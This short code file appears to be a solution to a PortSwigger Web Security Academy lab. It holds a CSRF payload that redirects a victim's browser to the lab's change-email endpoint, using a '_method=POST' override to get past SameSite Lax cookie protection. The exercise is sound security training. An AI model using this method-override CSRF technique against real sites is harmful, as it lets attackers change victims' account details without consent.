// The HTML payload below is meant to solve the following lab:
// https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override

document.location = "https://[SUB_DOMAIN].web-security-academy.net/my-account/change-email?_method=POST&email=wiener3@normal-user.net";

/*
<script>
    document.location = "https://[SUB_DOMAIN].web-security-academy.net/my-account/change-email?_method=POST&email=wiener3@normal-user.net";
</script>
*/